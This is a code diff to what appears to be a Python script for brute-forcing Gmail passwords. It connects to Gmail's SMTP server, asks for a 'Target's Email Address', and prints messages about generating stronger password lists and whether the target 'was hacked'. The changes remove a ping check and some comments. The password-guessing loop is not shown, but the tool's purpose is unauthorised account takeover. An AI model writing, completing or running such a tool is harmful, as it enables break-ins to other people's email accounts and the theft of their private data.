@@ -30,20 +30,11 @@ untick = bcolors.FAIL + '✘' + bcolors.ENDC + ' '
 #Clear Command
 os.system("clear")
 
-print (rpfp + bcolors.BOLD + '{ '+tick+'} ping (www.gmail.com)' + bcolors.OKBLUE +  ' ') # Pinging gmail alert
-time.sleep(0.25)
+print (rpfp + '{ '+tick+'} Connecting To SMTP Server ! ' + bcolors.ENDC + ' ')
 print ("")
-print (rpfp + '{ '+tick+'/ '+untick+'} Checking Gmail availability started')  #checking availability notification
-print ("")
-os.system("ping www.gmail.com -c 3")  #pinging gmail command 
-print ("")
-print (rpfp + '{ '+tick+'} Gmail is now available to work !') #gmail availability alert
-print ("")
-print (rpfp + '{ '+tick+'} Connecting To The Server ! ' + bcolors.ENDC + ' ')
-print ("")
-smtpserver = smtplib.SMTP("smtp.gmail.com", 587)  #Defining the smtp server
+smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
 smtpserver.ehlo()
-smtpserver.starttls() #connecting to the server
+smtpserver.starttls()
 print (rpfp + '{ '+tick+'} Connected !' + bcolors.ENDC + ' ')
 print ("")
 user = raw_input( rpfp + "{ "+tick+"} Enter the Target's Email Address ==>  ") #selecting target
@@ -79,7 +70,6 @@ print (rpfp + bcolors.FAIL + "(" + user + ")" +  " >" + bcolors.ENDC + " { "+unt
 print ("")
 print (rpfp + bcolors.FAIL + "(" + user + ")" + " >" + bcolors.ENDC + " { "+tick+"} Try To Change The Keywords And Generate A New More Powerful Password List ¯\_(ツ)_/¯ " + bcolors.ENDC + ' ')
 print ("")
-print (rpfp + bcolors.FAIL + "(" + user + ")" + " >" + bcolors.ENDC + " { "+untick+'} Your Target ' + "( " + user + " )" + ' Was not Hacked!' + bcolors.ENDC + ' ')   #target not hacked alert
 time.sleep(0.5)
 print ("")
 print (rpfp + bcolors.FAIL + "(" + user + ")" + " >" + bcolors.ENDC + ' { '+tick+'} Time elapsed: ' + str(time.time() - start_time) + bcolors.ENDC + ' ')   #time elapsed in tool
